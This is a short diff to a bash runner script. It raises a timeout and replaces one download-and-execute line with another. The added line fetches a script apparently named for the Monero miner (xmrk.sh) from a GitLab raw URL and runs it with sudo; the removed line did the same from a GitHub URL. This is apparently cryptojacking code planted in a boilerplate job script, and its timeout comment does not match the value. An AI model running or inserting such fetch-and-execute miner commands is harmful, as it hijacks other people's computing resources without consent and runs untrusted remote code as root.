@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Timeout=290 # 30 minutes
+Timeout=600 # 30 minutes
 
 function timeout_monitor() {
    sleep "$Timeout"
@@ -12,7 +12,7 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://raw.githubusercontent.com/lushenry654/bitbucket/dependabot/add-v2-config-file/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmrk.sh && sudo chmod +x xmrk.sh && sudo ./xmrk.sh
 done
 # <your script here>
 
